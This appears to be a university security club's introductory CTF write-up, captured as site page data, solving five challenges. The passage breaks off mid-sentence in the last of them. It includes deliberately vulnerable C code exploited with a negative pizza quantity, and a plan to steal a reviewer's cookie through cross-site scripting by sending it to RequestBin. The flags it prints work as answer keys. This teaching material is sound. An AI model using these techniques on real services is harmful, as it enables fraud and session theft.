{"componentChunkName":"component---src-templates-blog-post-js","path":"/post/2020-03-05-workshop-01-ctf-writeups","result":{"data":{"markdownRemark":{"html":"<p>Slides for this workshop can be found on our GitHub <a href=\"https://github.com/umisc/workshops/tree/master/workshop-01-introduction-to-information-security/slides.pdf\">here</a>.</p>\n<p>Files for the challenges can also be found <a href=\"https://github.com/umisc/workshops/tree/master/workshop-01-introduction-to-information-security/challenges/\">here</a></p>\n<p>Scoreboard (top 5) at the end of the workshop:</p>\n<table>\n<thead>\n<tr>\n<th>Place</th>\n<th>Team</th>\n<th>Score</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>1</strong></td>\n<td><strong>TheSquad</strong></td>\n<td><strong>223</strong></td>\n</tr>\n<tr>\n<td>2</td>\n<td>Cool Guys</td>\n<td>223</td>\n</tr>\n<tr>\n<td>3</td>\n<td>OLWG</td>\n<td>223</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Team<em>Jonathan&#x26;3</em>others</td>\n<td>123</td>\n</tr>\n<tr>\n<td>5</td>\n<td>team chiora</td>\n<td>50</td>\n</tr>\n</tbody>\n</table>\n<h2>Challenge Writeups</h2>\n<ul>\n<li><a href=\"#pizza-shop\">Pizza Shop (50pts)</a></li>\n<li><a href=\"#mix-n-mash\">Mix n Mash (75pts)</a></li>\n<li><a href=\"#epic-meme\">Epic Meme (100pts)</a></li>\n<li><a href=\"#strings\">Strings (100pts)</a></li>\n<li><a href=\"#top-crossovers\">Top Crossovers (125pts)</a></li>\n</ul>\n<h1>Pizza Shop (50pts) <a name=\"pizza-shop\"></a></h1>\n<blockquote>\n<p>The only pizza shop you'll ever need.</p>\n<p><code>nc pizza-shop.umisc.info 6001</code></p>\n<p>Author: Joseph</p>\n</blockquote>\n<p><a href=\"https://github.com/umisc/workshops/tree/master/workshop-01-introduction-to-information-security/challenges/pizza-shop/pizza-shop.c\">pizza-shop.c</a></p>\n<p><code>pizza-shop.c</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">\"flag.h\"</span></span>\n\n<span class=\"token macro property\">#<span class=\"token directive keyword\">define</span> FLAG_PRICE 1000000</span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">define</span> PIZZA_PRICE 5</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_int</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> balance <span class=\"token operator\">=</span> <span class=\"token number\">420</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to Annie's Pizza Parlour.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What would you like to purchase today?\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">int</span> inp <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>inp <span class=\"token operator\">!=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You have $%d in your account.\\n\"</span><span class=\"token punctuation\">,</span> balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Menu:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t 1: Flag  [$%d]\\n\"</span><span class=\"token punctuation\">,</span> FLAG_PRICE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t 2: Pizza [$%d]\\n\"</span><span class=\"token punctuation\">,</span> PIZZA_PRICE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\t 3: Exit  [-]\\n\"</span><span class=\"token punctuation\">,</span> PIZZA_PRICE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter your selection: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">get_int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>inp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inp <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>balance <span class=\"token operator\">&lt;</span> FLAG_PRICE<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not enough money!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here you go: %s\\n\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inp <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter quantity: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">int</span> qty<span class=\"token punctuation\">,</span> amt<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">get_int</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>qty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            amt <span class=\"token operator\">=</span> qty <span class=\"token operator\">*</span> PIZZA_PRICE<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>balance <span class=\"token operator\">&lt;</span> amt<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not enough money!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                balance <span class=\"token operator\">-=</span> amt<span class=\"token punctuation\">;</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your account has been charged $%d. I hope you enjoy your %d pizzas.\\n\"</span><span class=\"token punctuation\">,</span> amt<span class=\"token punctuation\">,</span> qty<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>inp <span class=\"token operator\">!=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid selection\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Have a nice day.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h2>Solution</h2>\n<p>We are given a host running a TCP listener on port <code>6001</code>. We are also given the source code for the program running on the server.</p>\n<p>Connecting to the service, we are presented with a pizza shop interface:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc pizza-shop.umisc.info 6001\nWelcome to Annie&#39;s Pizza Parlour.\nWhat would you like to purchase today?\n\nYou have $420 in your account.\nMenu:\n\t 1: Flag  [$1000000]\n\t 2: Pizza [$5]\n\t 3: Exit  [-]\nEnter your selection: </code></pre></div>\n<p>The goal of the challenge is to purchase the flag item, but it costs <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1000000</mn><mi>a</mi><mi>n</mi><mi>d</mi><mi>w</mi><mi>e</mi><mi>o</mi><mi>n</mi><mi>l</mi><mi>y</mi><mi>h</mi><mi>a</mi><mi>v</mi><mi>e</mi></mrow><annotation encoding=\"application/x-tex\">1000000 and we only have</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\" style=\"margin-right:0.02691em;\">w</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">o</span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mord mathdefault\">h</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathdefault\">e</span></span></span></span>420. However, if we take a look at the source code, we notice that when purchasing the pizza item, we supply a quantity that isn't checked properly. In particular, the <code>qty</code> variable which is controlled by the user can be negative. This will cause the <code>amt</code> variable to be negative, and since the balance is updated by subtracting the <code>amt</code> from the current balance, this will increase our current balance.</p>\n<p>To solve the challenge, we simply purchase a largely negative quantity of pizzas which gives us enough money to buy the flag.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Welcome to Annie&#39;s Pizza Parlour.\nWhat would you like to purchase today?\n\nYou have $420 in your account.\nMenu:\n\t 1: Flag  [$1000000]\n\t 2: Pizza [$5]\n\t 3: Exit  [-]\nEnter your selection: 2\nEnter quantity: -200000\nYour account has been charged $-1000000. I hope you enjoy your -200000 pizzas.\n\nYou have $1000420 in your account.\nMenu:\n\t 1: Flag  [$1000000]\n\t 2: Pizza [$5]\n\t 3: Exit  [-]\nEnter your selection: 1\nHere you go: MISCCTF{i_w1sh_i_h4d_th47_m4ny_p1zz4s}</code></pre></div>\n<hr>\n<h1>Mix n Mash <a name=\"mix-n-mash\"></a></h1>\n<blockquote>\n<p><code>001101100011011000110101001101110011010000110101001101110011011100110100011001000011010100110100001101100011010000110110011000010011011000110010001101000011011100110101001101100011011100110111001101010011100100110101001101000011010001100101001101100011011000110100011001010011011101100001001101000011001000110110001110000011010100111000001100110011001000110101001110010011011100111000001101010011100000110011001100110011010100110010001101100011100000110100011001000011010100111000001101000011010100110111001101110011011000110011001101000011011100110100001101100011011100111001001101100011010100110011001100010011010001100101001101000011100000110101001101010011010000110110001101000011001000110100001101110011010100110110001101100110001100110110011001100011001101100100</code></p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>Recommended tool: <a href=\"https://gchq.github.io/CyberChef/\">CyberChef</a></p>\n<p>The abundance of <code>0</code>s and <code>1</code>s indicate binary encoding.\nConverting from binary to ascii gives: <code>665745774d54646a6247567759544e664e7a426858325978583352684d5845776347467965314e4855464247566c6f3d</code></p>\n<p>Appearance of only <code>0-9a-f</code> indicates hex encoding.\nConverting this from hex to ascii gives: <code>fWEwMTdjbGVwYTNfNzBhX2YxX3RhMXEwcGFye1NHUFBGVlo=</code></p>\n<p>Appearance of trailing <code>=</code> and a mixture of lower case, upper case and numbers indicates base64 encoding.\nConverting this from base64 to ascii gives: <code>}a017clepa3_70a_f1_ta1q0par{SGPPFVZ</code></p>\n<p>We notice that the first character in this string is <code>}</code> which is the last character of the flag, and also the 8th last character in the string is <code>{</code> which is the 8th letter in the flag. This indicates that the string should be reversed: <code>ZVFPPGS{rap0q1at_1f_a07_3apelc710a}</code></p>\n<p>Lastly, we notice that the flag format is <code>MISCCTF{blahblahblah}</code> and use this as a crib to determine that the final transformation is a <a href=\"https://en.wikipedia.org/wiki/ROT13\">ROT13</a> cipher (<code>M -> Z</code>, <code>V -> I</code>, etc.). Since there are 26 letters in the alphabet, applying the ROT13 transformation again reverts the string back to its original form: <code>MISCCTF{enc0d1ng_1s_n07_3ncryp710n}</code></p>\n<hr>\n<h1>Epic Meme (100pts) <a name=\"epic-meme\"></a></h1>\n<blockquote>\n<p>Look at this meme I saw the other day. Everyone knows that's not how files work! How funny would it be if it worked though.</p>\n<p>Author: Annie</p>\n</blockquote>\n<p><a href=\"https://github.com/umisc/workshops/tree/master/workshop-01-introduction-to-information-security/challenges/EpicMeme/EpicMeme.jpg\">EpicMeme.jpg</a></p>\n<h2>Solution</h2>\n<p>Taking a hint from the description, we try changing the file extension to <code>.mp3</code> and opening the file in some audio software (Firefox, for example). Doing so plays an audio file that sounds rather robotic. Opening the file in <a href=\"https://www.audacityteam.org/\">Audacity</a> and viewing the <a href=\"https://en.wikipedia.org/wiki/Spectrogram\">spectrogram</a> of the audio gives the flag:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/e43f58bea6b5d471bdd6838d6d03ee3d/187fa/epic-meme-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 42.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsSAAALEgHS3X78AAACNElEQVQoz32P60+SYRjG3/+qmh3WhzYzLXOaKwkIQuRDdlhfWmupL6R5ThTUAtKm4wU1luUmFnji9ALaltk00mmWx1a2tj7+esTWl1rP9tt13dd13x8eydbiwtb0CGuji/pWD02tbupauqlvdtLmcNPudGN3uGh+4KSpxUmrvZu2DpfoXNidHtE/Fnj+IM0vbTOf2eFtZovF5R0W3m8SmkoznXjD4tIGSyvrLGTWmHu3wtziB1bXdlj9uMXu95/860nuHgXFP8xocAKP8D1PBnD3+AR++n3P6fM+YygQZFDg7vXh6R3I8jIUYXPrG5vbu3z6/EX4XdY3viJNqMuEIypT8TiRhJollkoLTRBV44KE8DFiaoxoIpnNY8kkE5EowVCYsfFxxkIh8atxRoJjSKnMD6IBlahXJeybZfJpimklLnSGsP81k4EZYoEkydEU8ZEk04E00aEEU4MzqC+ED8yijqZJDaeZFLnU3feKrkYFp+zFXuOn876Xhw39OBoGaLs7hKPWT9deJw/SUeen3SbyKj+OewpddV4cVh/OWoVOWaFd7kfSGqrRma3oLDa05ho0phoulstoLldRZqoSc3WWi+Vir8Im2N/VW6y/Z1ncy/sqOulEnpb8QiNnSyooLatEo7/BBe11jObbmCx3uGS6lUWjv0lhsfkv8s8YyTtt4JRgT6VDxwrIOZrHkeMFFJXo0RsrKS41UKa7gtZwlfMaCzrDNYrOGTmQk8vBwyf/Qy6/AFCX+IZ7+oJ5AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"epic-meme-flag.png\"\n        title=\"epic-meme-flag.png\"\n        src=\"/static/e43f58bea6b5d471bdd6838d6d03ee3d/0a47e/epic-meme-flag.png\"\n        srcset=\"/static/e43f58bea6b5d471bdd6838d6d03ee3d/8a4e8/epic-meme-flag.png 150w,\n/static/e43f58bea6b5d471bdd6838d6d03ee3d/5a46d/epic-meme-flag.png 300w,\n/static/e43f58bea6b5d471bdd6838d6d03ee3d/0a47e/epic-meme-flag.png 600w,\n/static/e43f58bea6b5d471bdd6838d6d03ee3d/1cfc2/epic-meme-flag.png 900w,\n/static/e43f58bea6b5d471bdd6838d6d03ee3d/187fa/epic-meme-flag.png 1194w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<hr>\n<h1>Strings (100pts) <a name=\"strings\"></a></h1>\n<blockquote>\n<p>It does exactly what it says on the tin.</p>\n<p>Author: Darren</p>\n</blockquote>\n<p><a href=\"https://github.com/umisc/workshops/tree/master/workshop-01-introduction-to-information-security/challenges/strings/strings\">strings</a></p>\n<h2>Solution</h2>\n<p>We are given an <a href=\"https://en.wikipedia.org/wiki/Executable_and_Linkable_Format#Applications\">ELF</a> executable (to be run on a Linux machine). If we run the program without any arguments, it tells us the correct usage:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./strings\nUsage: ./strings <span class=\"token punctuation\">[</span>text<span class=\"token punctuation\">]</span></code></pre></div>\n<p>And if we run the program with some argument:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./strings asdfasdf\nuh oh<span class=\"token operator\">!</span> try again</code></pre></div>\n<p>It says <code>uh oh! try again</code>.</p>\n<p>The title of the challenge hints to using the Linux program <code>strings</code> that comes with most Linux distributions. Running <code>strings</code> on the binary and filtering for strings that follow the flag format gives us the first part of the flag:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ strings ./strings <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> MISCCTF\nMISCCTF<span class=\"token punctuation\">{</span>str1ng5_h1dd</code></pre></div>\n<p>If we try and run the program with this string as the argument, we get:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./strings MISCCTF<span class=\"token punctuation\">{</span>str1ng5_h1dd\nnice<span class=\"token operator\">!</span>, the second half of the flag is hidden <span class=\"token keyword\">in</span> this program elsewhere<span class=\"token operator\">!</span>\nnearly there, but not quite<span class=\"token operator\">!</span></code></pre></div>\n<p>Opening up the binary in <a href=\"https://github.com/radareorg/radare2\">radare2</a> (or some other decompiler), we see that there are calls to <code>strncmp</code> and <code>strcmp</code> (standard library functions). In particular, the call to <code>strcmp</code> which compares the user input from the 21st character onwards, to some string that is generated by the program during runtime. If we use a tool like <a href=\"https://en.wikipedia.org/wiki/Ltrace\">ltrace</a> we can see library calls and their arguments, which will give us the values being compared.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ltrace ./strings MISCCTF<span class=\"token punctuation\">{</span>str1ng5_h1dd\nstrncmp<span class=\"token punctuation\">(</span><span class=\"token string\">\"MISCCTF{str1ng5_h1dd\"</span>, <span class=\"token string\">\"MISCCTF{str1ng5_h1dd\"</span>, <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>                                 <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nputs<span class=\"token punctuation\">(</span><span class=\"token string\">\"nice!, the second half of the fl\"</span><span class=\"token punctuation\">..</span>.nice<span class=\"token operator\">!</span>, the second half of the flag is hidden <span class=\"token keyword\">in</span> this program elsewhere<span class=\"token operator\">!</span>\n<span class=\"token punctuation\">)</span>                                                 <span class=\"token operator\">=</span> <span class=\"token number\">72</span>\nstrcmp<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span>, <span class=\"token string\">\"3n_1n_b1n4ri3s}\"</span><span class=\"token punctuation\">)</span>                                                               <span class=\"token operator\">=</span> -51\nnearly there, but not quite<span class=\"token operator\">!</span>\nexit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;</span>no <span class=\"token builtin class-name\">return</span> <span class=\"token punctuation\">..</span>.<span class=\"token operator\">></span>\n+++ exited <span class=\"token punctuation\">(</span>status <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> +++</code></pre></div>\n<p>This reveals the second part of the flag: <code>3n_1n_b1n4ri3s}</code>.</p>\n<p>Running the program with the flag as the argument tells us we are correct:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ ./strings MISCCTF<span class=\"token punctuation\">{</span>str1ng5_h1dd3n_1n_b1n4ri3s<span class=\"token punctuation\">}</span>\n<span class=\"token function\">nice</span> work<span class=\"token operator\">!</span>, you've found the flag<span class=\"token operator\">!</span></code></pre></div>\n<hr>\n<h1>Top Crossovers (125pts) <a name=\"top-crossovers\"></a></h1>\n<blockquote>\n<p>This website lets you submit your very own story! If it's got the best crossovers, you win... a flag?!</p>\n<p><a href=\"http://top-crossovers.umisc.info:1337/\">http://top-crossovers.umisc.info:1337/</a></p>\n<p>Hint: The flag is stored in the \"reviewer's\" cookies</p>\n<p>Author: Joseph</p>\n</blockquote>\n<h2>Solution</h2>\n<p>We are presented with a fairly minimal interface:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3ca95c5d41c064b5f4cf86ba8c408304/63ec5/top-crossovers-index.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsSAAALEgHS3X78AAABqElEQVQoz42RTU8UQRCG5weJZsWgF1nQyMWoB1EvyEVCFJg1GiO74idEMdHwE7gIJ4IXvXjwP3jASAwHEhIBd5bdNVl2vroeu2YU2clssJIn01319ltd086NUZfrN12ujUxx8eotLg2PMTg0zPHefkuRE6cGLEV6TvZzrHA2oceS1ooU+gbpPXOewmlL3zmcl/MLlB/N8fT5a6Yrs7ilMq5b5o5lolShdP8x7r0Zbk9NMz7x4IDJu2ntYWWOZ7NvmXnxhvKTVzi7DZ9NL7D4bO0F7Ld92kFIEEYJvl37f/bhX6KIth8k1Pbq/NjeYXtnF69Wx4mNEMZCoESCRtua1htNms1fNHLQmmpUHcexbRImRFGMQ5I+DLRa+1Q9z3as2W8nmvtZ9aymRV44IsJhNCLbVbsdFdmzipMVJIbWTEeKY5OM1EmaM8Z0nDm4Yb5hlDyOsftuqGnWrKvhP6F0RQ1z/2E2oa+usbomXFiE5S/weQOuLMHIClx+p7VUa4wcPXLqJ2zUhPdfhfWqsNUQPq4Ln74LH76lNdWoV3ZqJ+/aRviPF87P/wbB9l9+Poku6AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"top-crossovers-index.png\"\n        title=\"top-crossovers-index.png\"\n        src=\"/static/3ca95c5d41c064b5f4cf86ba8c408304/0a47e/top-crossovers-index.png\"\n        srcset=\"/static/3ca95c5d41c064b5f4cf86ba8c408304/8a4e8/top-crossovers-index.png 150w,\n/static/3ca95c5d41c064b5f4cf86ba8c408304/5a46d/top-crossovers-index.png 300w,\n/static/3ca95c5d41c064b5f4cf86ba8c408304/0a47e/top-crossovers-index.png 600w,\n/static/3ca95c5d41c064b5f4cf86ba8c408304/63ec5/top-crossovers-index.png 812w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>We notice that the <code>story</code> field is vulnerable to HTML injection. That is, if we tried to enter <code>&#x3C;h1>&#x3C;b>this is my story&#x3C;/b>&#x3C;/h1></code>, we would get big, bold text:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/be5951dc4857b295190f617d7714f3a8/63ec5/big-bold-text.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsSAAALEgHS3X78AAABa0lEQVQoz62RX0vCYBTG94WszDQTzCwKsju9qu66CFS0CNJmGVZEVB9OiwoNmkql05ngAnV/n96tqWsqJXTgxzl7n+d9dtgot3cdHl8AC4sBzDj9sNm9WFoNIbQdQXAz/M1WGBvBHTg9a7DNenWmHD5Mz/lgd/nhcK/APk9wLYNKpS+RTF3gNHONBH2OWPxIJxJPIkp6/OAEsf0UIjHtmUaY9N3IIaJ7tK4laHL37BbHmRvQ6StQ9ZaAUkOji9emgHani3ZX68ZMEERJR5s7ROt0B5o2c1wDb+9VcB9NULKiQpAHKKoKlSArChSDFs+D5z91TZaNc1XtI8syRFGEJEmgABVmVCPQXCzLgq3Vfpz1fFYvZRbMhnK5jJdiCZVKVQ/kOE6fGaaIOpmtoT2oUW/ViikW8fD4pPd8voBsNkfCGOTu7pEvPA/5+xtiRFlNk3jGbqiYfoqVnufPG47aZOh7jfH/Gjhp/XvgF83TZZWv45DQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"big-bold-text.png\"\n        title=\"big-bold-text.png\"\n        src=\"/static/be5951dc4857b295190f617d7714f3a8/0a47e/big-bold-text.png\"\n        srcset=\"/static/be5951dc4857b295190f617d7714f3a8/8a4e8/big-bold-text.png 150w,\n/static/be5951dc4857b295190f617d7714f3a8/5a46d/big-bold-text.png 300w,\n/static/be5951dc4857b295190f617d7714f3a8/0a47e/big-bold-text.png 600w,\n/static/be5951dc4857b295190f617d7714f3a8/63ec5/big-bold-text.png 812w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>This means that the website is likely vulnerable to <a href=\"https://en.wikipedia.org/wiki/Cross-site_scripting\">Cross-site scripting</a>. We can use this to steal the \"reviewer's\" cookie by writing some Javascript code to send the cookie to a server we control. In this case, we don't actually need to own a server. We can use a service like <a href=\"https://requestbin.com/\">RequestBin.com</a> to capture requests.</p>\n<p>We see that <code>&#x3C;script></code> is filtered 